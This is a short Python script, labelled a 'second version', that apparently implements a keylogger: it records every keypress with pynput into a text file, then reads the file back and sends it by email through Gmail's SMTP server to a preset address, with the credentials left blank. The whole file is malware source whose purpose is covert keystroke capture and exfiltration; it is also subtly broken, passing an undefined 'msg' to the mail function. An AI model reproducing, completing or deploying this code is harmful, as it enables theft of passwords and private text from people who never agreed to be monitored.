"""
This is a second version.
Sending the txt file to email.

"""

from pynput.keyboard import Key, Listener
import logging
import smtplib

def main():
    def send_email(sender_email,sender_pw,receiver_email,msg):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email,sender_pw)


        server.sendmail(sender_email,receiver_email,str(msg))
        server.quit()

    def on_type(key):
        logging.info(key)

    #Logging
    log_path = "." #modify where you want to put the path (use ABSOLUTE PATH)
    log_txt_name = "/cS_logv2.txt"
    log_path_txt = log_path + log_txt_name

    logging.basicConfig(filename=(log_path_txt), level=logging.DEBUG, format='%(message)s')

    #EventListener
    with Listener(on_press=on_type) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            pass

    #Send the txt file as email (stored in a list)
    keys = []
    with open(log_path_txt, 'r') as f:
        lines = f.readlines()
        for line in lines:
            keys.append(line)

    sender_email = ""
    sender_pw = ""
    receiver_email = ""

    send_email(sender_email,sender_pw,receiver_email,msg)

if __name__ == '__main__':
    main()
